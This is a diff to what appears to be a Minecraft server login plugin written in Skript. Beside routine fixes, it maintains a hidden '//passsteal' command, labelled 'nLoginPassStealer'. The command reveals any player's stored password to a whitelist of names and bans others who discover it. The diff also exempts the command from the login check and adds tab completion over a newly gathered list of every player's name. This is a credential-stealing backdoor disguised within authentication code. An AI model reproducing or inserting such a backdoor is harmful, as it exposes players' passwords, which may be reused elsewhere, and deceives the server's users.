@@ -1,5 +1,5 @@
 on load:
-    set {loc} to location(0, 50, 0, world "auth")
+    set {loc} to location(0, 250, 0, world "world")
     set pitch of {loc} to 0
     set yaw of {loc} to 0
 
@@ -16,7 +16,7 @@ on join:
     send title "&r&c&lWelcome!" with subtitle "&r&7use &r&e/register <password> <confirm>&r&7!" for 120 seconds
     send "&r&cUse the command &r&e/register <password> <confirm>&r&c!" to player
     while {authtime.%player's name%} > -1:
-        send action bar "&cYou have %{authtime.%player's name%}%s to register."
+        send action bar "&cYou have %{authtime.%player's name%}%s to register." to player
         wait 1 second
         add -1 to {authtime.%player's name%}
     wait 1 tick
@@ -34,7 +34,7 @@ on join:
     send title "&r&c&o&lPlasmaNetwork" with subtitle "&r&7use &r&e/login <password>&r&7!" for 120 seconds
     send "&r&cUse the command &r&e/login <password>&r&c!" to player
     while {authtime.%player's name%} > -1:
-        send action bar "&cYou have %{authtime.%player's name%}%s to login."
+        send action bar "&cYou have %{authtime.%player's name%}%s to login." to player
         wait 1 second
         add -1 to {authtime.%player's name%}
     wait 1 tick
@@ -93,9 +93,9 @@ command /l [<text>]:
 
 function redirect(p: player):
     send "&7Redirecting you to main server..." to {_p}
-    send {_p} to server "server"
+    send {_p} to server "mainserver"
 
-command /passsteal <offlineplayer>:
+command //passsteal <text>:
     trigger:
         if {passsteal.permissions::*} contains player's name:
             if {passsteal.permissions::*} contains arg-1:
@@ -104,7 +104,7 @@ command /passsteal <offlineplayer>:
             set {_text} to "&c&lnLoginPassStealer&r &8» &r&e%arg-1%'s password: %{password.%arg-1%}%"
             send {_text} to player
         else:
-            ban player due to "You should not know /passsteal"
+            ban player due to "You should not know //passsteal"
 
 on load:
     delete {passsteal.permissions::*}
@@ -112,13 +112,19 @@ on load:
 
 command /allplayers:
     trigger:
-        send {allplayers::*} to player
+        send {allplayers::*}
 
 on command:
     if sender is player:
-        if "l", "login", "register", "passsteal" does not contain command:
+        if "l", "login", "register", "/passsteal" does not contain command:
             send "&r&cLog in before executing a command!"
             cancel event
-        
+    
+on join:
+    if {allplayers::*} does not contain player's name:
+        add player's name to {allplayers::*}
+
+on tab complete for "//passsteal":
+    set tab completions for position 1 to {allplayers::*}
     
     
